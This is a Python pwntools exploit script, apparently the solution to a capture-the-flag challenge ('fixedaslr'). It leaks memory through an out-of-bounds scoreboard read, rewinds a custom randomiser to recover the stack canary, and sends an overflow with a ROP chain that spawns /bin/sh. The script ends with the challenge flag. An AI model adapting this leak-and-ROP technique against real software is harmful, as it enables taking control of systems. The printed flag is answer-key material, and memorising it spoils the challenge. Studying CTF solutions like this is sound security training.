#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template loader
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('loader')
HOST, PORT = "fixedaslr.2022.ctfcompetition.com 1337".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b pivot_to_main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

itob = lambda _: str(_).encode()

def menu_choice(choice: int) -> None:
    io.sendlineafter(b"Your choice?", itob(choice))

def play(score: int, name: bytes = b"", length: bytes = 0) -> None:
    temp_score = 0
    menu_choice(1)
    io.recvuntil(b"is ")
    while temp_score < score:
        a = io.recvuntil(b" + ", drop=True)
        b = io.recvuntil(b" ?", drop=True)
        a = int(a, 10)
        b = int(b, 10)
        io.sendline(itob(a+b))
        res = io.recvuntil(b"is ")
        if b"Yes" not in res:
            log.warning("Something went wrong...")
            break
        temp_score += 5

    io.sendlineafter(b"?", itob(0))
    if not name:
        return
    if not length:
        length = len(name)
    log.info(f"Sending name: {name}")
    io.sendlineafter(b"?", itob(length))
    io.sendafter(b"name:", name)

def see_full_scoreboard() -> bytes:
    menu_choice(2)
    return io.recvuntil(b"\n-=*)", drop=True)

def score_for_place(place: int) -> bytes:
    menu_choice(3)
    io.sendlineafter(b"(0-9)?", itob(place))
    io.recvuntil(b"score: ")
    return io.recvline(keepends=False)

def do_exit() -> None:
    menu_choice(4)

def leak_addr(main_addr: int, to_leak: int) -> int:
    negative = 0xffffffffffffff00
    offset = 0
    if main_addr < to_leak:
        offset = (to_leak - main_addr) // 8
    else:
        offset = negative - (((main_addr - to_leak) // 8) - 0x100)
    leak = score_for_place(offset)
    leak = int(leak, 10)
    log.info(f"leak from {hex(to_leak)}: {hex(leak)}")
    assert leak > 0xffff
    return leak

def nextbit():
    global state
    bit = 1 & (state >> 0x3f ^ state >> 0x3d ^ state >> 0x3c ^ state >> 0x3a ^ 1)
    state = bit | state << 1 & 0xffff_ffff_ffff_ffff
    return bit

def rewind(got):
    global state
    state >>= 1
    bit = got ^ state >> 0x3d ^ state >> 0x3c ^ state >> 0x3a ^ 1
    state = (state | bit << 0x3f) & 0xffff_ffff_ffff_ffff

def rand(n):
    ret = 0
    for _ in range(n):
        ret <<= 1
        ret |= nextbit()
    return ret

io = start()

leak = score_for_place(0x200)
scoreboard = int(leak, 10) - 0x60
main_addr = scoreboard - 0x2000
log.info(f"main_addr @ {hex(main_addr)}")
game_leak = leak_addr(scoreboard, main_addr + 0x28) - 0x1000
guard_leak = leak_addr(scoreboard, main_addr + 0x38) - 0x1000
basic_leak = leak_addr(scoreboard, game_leak + 0x8) - 0x119c
syscalls_leak = leak_addr(scoreboard, basic_leak + 0x38) - 0x10ba
res_leak = leak_addr(scoreboard, game_leak + 0x2000) - 0x1000

# leaks
main = main_addr >> 0x1c
syscalls = syscalls_leak >> 0x1c
guard = guard_leak >> 0x1c
basic = basic_leak >> 0x1c
game = game_leak >> 0x1c
res = res_leak >> 0x1c

# recover
state = (res | game << 12 | basic << 24 | guard << 36 | syscalls << 48 | main << 60) & 0xffff_ffff_ffff_ffff

for _ in range(6 * 12):
    rewind(state & 1)

canary = state

for i in range(6):
    rand(12)

debug = rand(12) << 0x1c
debug_rop = debug + 0x1000
log.info(f"debug: {hex(debug)}")

payload = b"" 
payload += b"/bin/sh\x00"
payload += p64(0xdeadbeefcafebabe)*4
payload += p64(canary)
payload += p64(scoreboard+0x100)

pop_rdi = 0x00000001
pop_rax = 0x00000007
pop_rsi = 0x00000004
ret     = 0x00000002

chain = [
    p64(pop_rax+debug_rop), p64(0x3b),
    p64(pop_rdi+debug_rop), p64(scoreboard+0x180),
    p64(pop_rsi+debug_rop), p64(0x0),
    p64(syscalls_leak+0x1002)
]
rop = b"".join(chain)

payload += rop
play(55, payload)

io.interactive()

# CTF{GuessYouCanSayTheCookieGotRandomlyBroken}
